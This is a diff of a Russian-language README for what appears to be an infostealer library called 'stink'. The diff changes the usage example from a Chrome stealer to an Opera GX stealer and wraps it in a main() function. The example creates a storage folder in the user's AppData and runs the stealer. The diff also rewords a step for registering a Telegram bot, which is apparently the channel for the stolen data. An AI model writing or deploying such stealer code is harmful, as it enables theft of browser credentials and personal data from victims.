@@ -46,17 +46,24 @@ stealer.run()
 from os import path, mkdir
 from getpass import getuser
 
-from stink.browsers.chrome import Chrome
+from stink.browsers.opera_gx import Opera_GX
 
 storage_path = f"C:/Users/{getuser()}/AppData/"
 storage_folder = "files/"
 
-if not path.exists(storage_path + storage_folder):
 
-    mkdir(storage_path + storage_folder)
+def main():
 
-stealer = Chrome(storage_path=storage_path, storage_folder=storage_folder)
-stealer.run()
+    if not path.exists(storage_path + storage_folder):
+        mkdir(storage_path + storage_folder)
+
+    stealer = Opera_GX(storage_path=storage_path, storage_folder=storage_folder)
+    stealer.run()
+
+
+if __name__ == "__main__":
+    main()
+
 ```
 ## Настройка Telegram бота
 ### Получение токена
@@ -69,7 +76,7 @@ stealer.run()
   </a>
 </p>
 
-3. Прописываем название бота с прикладкой ```_bot``` в конце.
+3. Прописываем название бота, затем ник с прикладкой ```_bot``` в конце.
 
 <p align="left">
   <a href="">
